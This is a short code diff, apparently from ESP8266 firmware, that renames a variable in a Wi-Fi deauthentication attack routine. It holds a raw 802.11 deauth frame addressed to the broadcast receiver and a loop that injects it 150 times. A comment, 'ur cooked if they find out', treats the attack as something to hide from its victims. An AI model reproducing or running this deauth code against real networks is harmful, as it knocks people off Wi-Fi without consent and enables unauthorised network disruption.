@@ -12,7 +12,7 @@
  *
 */
 
-uint8_t deauthPacket[26] = {
+uint8_t deauthFrame[26] = {
     /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
     /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
     /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
@@ -112,11 +112,11 @@ void Deauth::deauth() {
 
 void Deauth::start() {
     running = true;
-    int frameSize = sizeof(deauthPacket);
+    int frameSize = sizeof(deauthFrame);
 
     // send the deauth 150 times(ur cooked if they find out)
     for (int i = 0; i < 150; ++i) {
-        wifi_send_pkt_freedom(const_cast<uint8_t*>(deauthPacket), frameSize, 0);
+        wifi_send_pkt_freedom(const_cast<uint8_t*>(deauthFrame), frameSize, 0);
         Serial.println("(>-<) Sent Deauth Frame!");
         delay(100);
     }
